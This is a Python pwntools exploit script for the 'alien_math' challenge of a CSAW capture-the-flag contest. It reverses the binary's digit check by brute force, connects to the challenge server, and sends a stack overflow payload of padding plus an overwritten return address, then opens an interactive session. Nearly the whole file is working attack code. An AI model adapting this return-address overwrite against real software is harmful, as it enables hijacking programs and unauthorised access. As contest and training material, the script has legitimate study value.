from pwn import *

a = 'b *0x00000000004014bb'

def calc(num):
    io = gdb.debug('./alien_math', '''
    b *0x00000000004014bb
    continue
    call puts($rcx)
    call puts($rax)
    detach
    quit
    ''')
    io.recv()
    io.sendline(b'1804289383')
    io.recv()
    io.sendline(num)
    print(io.recv())
    return io.recv()

def calce(f, i):
    a = f
    b = f + i
    c = ((3*a) << 4) + (((3*b) << 2) - 4) - b
    d = ((c*0xcccccccd) >> 0x20) >> 3
    e = (d << 2) + d
    e = e + e
    return c - e

def calcn(s, e):
    x=s+e
    y=((x*0x66666667)>>0x20)>>2
    z=x>>0x1f
    z=((y-z)<<2)+(y-z)
    z=z+z
    return x-z

def calc_guess(num):
    r = bytearray(num)
    for i in range(len(num) - 1):
        f = r[i]-0x30
        s = r[i+1]-0x30
        e = calce(f, i)
        n = calcn(s, e)
        r[i+1] = (n+0x30)
    return bytes(r)

def bf(n):
    r = bytearray(len(n))
    n = bytearray(n)
    r[0] = n[0]
    for i in range(len(n) - 1):
        f = n[i]-0x30
        e = calce(f, i)
        for s in range(10):
            z = calcn(s, e)
            z = z+0x30
            if z == n[i+1]:
                r[i+1] = s+0x30
                break
    return bytes(r)

#print(calc(b'7867227945219470117521'))
#print(calc_guess(b'7867227945219470117521'))
def exploit():
    fst_door = b'1804289383'
    ret_address = b'\xfb\x14\x40'
    inp = bf(b'7759406485255323229225')
    io = remote('pwn.chal.csaw.io', 5004)
    io.sendline(fst_door)
    io.sendline(inp)
    io.sendline(b'a'*0x10 + b'b'*8 + ret_address)
    io.interactive()


if __name__=="__main__":
    exploit()
